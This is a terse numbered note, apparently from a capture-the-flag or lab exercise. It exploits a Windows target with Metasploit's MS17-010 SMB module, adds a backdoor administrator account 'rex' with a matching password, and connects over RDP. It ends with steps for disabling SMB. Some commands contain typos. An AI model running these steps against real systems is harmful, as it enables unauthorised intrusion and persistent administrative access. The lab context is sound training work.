1) start metaspoit -q
2) exploit with smb_ms17_010
3) net user rex rex /add
4) net localgroup adminstrators rex /add
5) net user 
5) xfreerdp /u:rex /p:rex /cert:ignore /v:MACHINE_IP
6) in the server Manager software
	select Start the Remove Roles and Features Wizard
	goto Features tab 
	disable SMB at the 1st.
	Save
7) 
